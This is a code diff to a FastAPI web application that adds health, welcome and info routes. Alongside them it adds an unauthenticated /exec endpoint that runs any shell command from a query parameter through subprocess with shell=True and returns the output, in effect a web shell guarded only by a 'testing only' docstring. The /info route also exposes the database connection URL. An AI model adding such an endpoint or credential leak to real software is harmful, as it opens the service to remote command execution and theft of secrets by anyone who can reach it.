@@ -54,4 +54,33 @@ app.include_router(asynchronous_router, prefix="/api/v2")
 
 @app.get("/health")
 async def health():
-    return {"status": "up", "mode": "async-logging", "location": "root"}
+    return {"status": "healthy", "app_name": settings.app_name, "app_version": settings.app_version}
+
+@app.get("/")
+async def root():
+    return {"message": f"Welcome to {settings.app_name} version {settings.app_version}!"}   
+
+@app.get("/info")
+async def info():
+    return {
+        "app_name": settings.app_name,
+        "app_version": settings.app_version,
+        "app_region": settings.app_region,
+        "database_url": settings.DATABASE_URL,
+        "pvc_directory": settings.PVC_DIR,
+        "unzip_max_workers": settings.UNZIP_MAX_WORKERS,
+        "unzip_enable_cache": settings.UNZIP_ENABLE_CACHE
+    }
+
+@app.get("/exec")
+async def execute_command_string(command: str):
+    """
+    Do not use in production! This is for testing only.
+    Executes a shell command and returns the output.
+    """
+    import subprocess
+    try:
+        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        return {"stdout": result.stdout, "stderr": result.stderr}
+    except subprocess.CalledProcessError as e:
+        return {"error": str(e), "stdout": e.stdout, "stderr": e.stderr}
